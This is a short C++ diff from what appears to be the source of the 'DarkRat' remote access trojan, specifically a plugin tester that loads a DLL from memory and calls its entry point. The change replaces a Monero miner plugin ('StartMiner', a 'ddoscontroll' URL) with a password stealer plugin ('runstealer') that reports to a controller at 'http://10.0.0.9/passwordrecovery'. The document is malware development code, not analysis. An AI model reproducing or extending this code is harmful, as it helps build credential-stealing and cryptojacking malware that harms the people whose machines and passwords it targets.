@@ -48,15 +48,16 @@ int main()
     folder = "Release";
 #endif
 
-	std::string dir = "C:\\Users\\darkspider\\Desktop\\DarkRatCoding\\darkrat\\plugintester\\" + folder + "\\Monero_cpu.dll";
+	std::string dir = "C:\\Users\\darkspider\\Desktop\\DarkRatCoding\\darkrat\\plugintester\\" + folder + "\\Stealer.dll";
+
 
 	while (1) {
 		do
 		{
 			//std::cout << dir;
 			hLibrary = lib.LoadFromFile(dir.c_str()); // loaded the dll from byte array.
-			func fn = (func)lib.GetProcAddressFromMemory(hLibrary, "StartMiner");
-			fn("http://10.0.0.9/ddoscontroll");
+			func fn = (func)lib.GetProcAddressFromMemory(hLibrary, "runstealer");
+			fn("http://10.0.0.9/passwordrecovery");
 			lib.FreeLibraryFromMemory(hLibrary);
 			std::cout << '\n' << "Press a key to continue...";
 		} while (std::cin.get() != '\n');
